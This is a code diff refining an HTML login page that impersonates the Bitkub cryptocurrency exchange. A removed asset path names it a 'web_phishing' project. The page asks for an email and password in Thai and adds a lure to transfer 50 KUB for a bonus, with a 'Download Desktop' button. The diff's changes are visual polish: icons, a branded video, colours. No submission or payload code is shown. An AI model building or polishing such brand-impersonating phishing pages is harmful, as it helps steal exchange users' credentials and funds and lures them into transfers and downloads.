@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Bitkub</title>
-  <link rel="icon" href="logobitkub.png" type="image/x-icon">
+  <link rel="icon" href="/logobitkub.png" type="image/x-icon">
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <link rel="stylesheet" href="login.css">
 </head>
@@ -13,7 +13,7 @@
   <!-- Navigation -->
   <nav class="flex items-center justify-between p-6 border-b max-w-7xl mx-auto">
     <div class="flex items-center">
-      <span><img src="/web_phishing/logo.svg" alt="Logo" class="h-8 w-auto"></span>
+      <span><img src="/public/logo.svg" alt="Logo" class="h-8 w-auto"></span>
     </div>
     <div class="flex justify-center">
         <div class="flex space-x-8">
@@ -30,21 +30,40 @@
 
 <div class="login-container">
     <div class="image-section">
-      <img src="https://via.placeholder.com/500x400" alt="ภาพประกอบการลงทุน" class="max-w-full h-auto">
+      <video autoplay muted loop class="w-full h-auto">
+        <source src="/public/bitkub_track.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
     </div>
     <div class="form-section">
       <div class="mb-8">
         <h1 class="text-2xl font-bold text-gray-900 mb-2">เข้าสู่ระบบ</h1>
       </div>
       
-      <div class="mb-4">
+      <div class="mb-4 relative">
         <label for="email" class="block text-sm font-medium text-gray-700">อีเมล</label>
-        <input type="email" id="email" placeholder="กรอกอีเมล" class="focus:ring-green-500 focus:border-green-500">
+        <div class="relative">
+          <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+            <!-- Email Icon (Envelope) -->
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
+            </svg>
+          </div>
+          <input type="email" id="email" placeholder="กรอกอีเมล" class="pl-10 focus:ring-green-500 focus:border-green-500">
+        </div>
       </div>
       
-      <div class="mb-4">
+      <div class="mb-4 relative">
         <label for="password" class="block text-sm font-medium text-gray-700">รหัสผ่าน</label>
-        <input type="password" id="password" placeholder="กรอกรหัสผ่าน" class="focus:ring-green-500 focus:border-green-500">
+        <div class="relative">
+          <div class="absolute inset-y-0 left-0 pl-2 flex items-center pointer-events-none">
+            <!-- Lock Icon -->
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+          </div>
+          <input type="password" id="password" placeholder="กรอกรหัสผ่าน" class="pl-10 focus:ring-green-500 focus:border-green-500">
+        </div>
       </div>
       
       <div class="text-right mb-4">
@@ -78,7 +97,7 @@
   </div>
 
   <!-- CTA Section -->
-  <div class="bg-emerald-500 text-white py-16">
+  <div class="bg-green-500 text-white py-16">
     <div class="max-w-6xl mx-auto px-4 text-center">
       <h2 class="text-3xl font-bold mb-4">
         Join us in the new era of investment with Start Bonus
@@ -86,11 +105,12 @@
       <p class="mb-8">
         Transfer 50 KUB to funding account using Desktop Application and receive +50 KUB Bonus
       </p>
-      <button class="bg-white text-emerald-500 px-8 py-3 rounded-md font-medium">
+      <button class="bg-white text-green-500 px-8 py-3 rounded-md font-medium">
         Download Desktop
       </button>
     </div>
   </div>
+
 
   <!-- Footer -->
   <footer class="bg-white py-8 border-t">
